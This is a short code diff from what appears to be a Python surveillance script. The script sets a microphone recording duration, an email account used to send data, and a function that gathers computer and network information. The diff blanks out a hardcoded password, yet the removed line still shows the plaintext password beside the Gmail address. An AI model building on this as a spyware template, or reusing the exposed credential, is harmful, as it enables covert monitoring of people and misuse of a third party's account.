@@ -32,7 +32,7 @@ microphone_time = 10 # 600 is 10 minutes
 
 # Email Controls
 email_address = "mustimmb566@gmail.com"
-password = "mistik566"
+password = ""
 
 # Get Computer and Network Information
 def computer_information():
